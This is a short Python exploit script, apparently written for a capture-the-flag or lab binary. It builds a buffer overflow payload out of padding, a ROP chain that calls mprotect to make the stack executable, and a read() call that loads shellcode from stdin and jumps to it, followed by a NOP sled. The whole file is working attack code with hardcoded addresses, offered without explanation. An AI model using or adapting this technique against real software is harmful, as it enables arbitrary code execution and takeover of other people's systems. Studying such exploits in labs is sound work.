#!/usr/bin/python
import struct
import sys


def p32(x):
    return struct.pack("<I", x)


offset = 44
mprotect = p32(0x80523E0)
exit = p32(0x8048B60)
stack = p32(0xFFFDD000)
size = p32(0x10000)
mode = p32(0x7)
pop3ret = p32(0x8048882)
nopsled = b"\x90" * 100
debug = p32(0xCC)
read = p32(0x80517F0)
stdin = p32(0x0)
shell_size = p32(0x300)

payload = b""
payload += b"A" * offset
## int mprotect(void *addr, size_t len, int prot);
payload += mprotect
# payload += debug
payload += pop3ret
payload += stack
payload += size
payload += mode
## ssize_t read(int fd, void *buf, size_t count);
payload += read
payload += stack  ## Jump here to execute payload
payload += stdin
payload += stack
payload += shell_size
payload += nopsled

sys.stdout.buffer.write(payload + b"\n")
